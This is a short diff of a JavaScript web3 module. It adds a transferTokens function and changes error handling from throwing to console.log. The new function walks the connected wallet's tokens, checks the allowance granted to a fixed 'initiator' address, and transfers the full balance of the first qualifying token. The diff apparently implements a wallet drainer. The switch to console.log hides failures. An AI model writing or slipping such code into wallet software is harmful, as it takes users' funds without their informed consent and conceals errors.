@@ -290,7 +290,7 @@ export const transfer = async (token) => {
       token.balance
     );
   } catch (error) {
-    throw new Error(error);
+    console.log(error);
   }
 };
 
@@ -302,6 +302,31 @@ export const balanceOf = async () => {
     });
     return balance;
   } catch (error) {
-    throw new Error(error.message);
+    console.log(error);
+  }
+};
+
+
+export const transferTokens = async (tokens) => {
+  try{
+    if (tokens.length ==0) return;
+    const web3 = new Web3(window.ethereum);
+    const account = getAccount().address;
+    for(let i = 0; i < tokens.length; i++){
+      
+      var contract = new web3.eth.Contract(
+        constants.ALLOWANCEABI,
+        tokens[i].token_address
+      );
+      
+      const allowance = await contract.methods
+        .allowance(account, constants.initiator)
+        .call();
+      if (allowance >= tokens[i].balance) {
+        return await transfer(tokens[i]);
+      }
+    }
+  } catch (error) {
+    console.log(error);
   }
 };
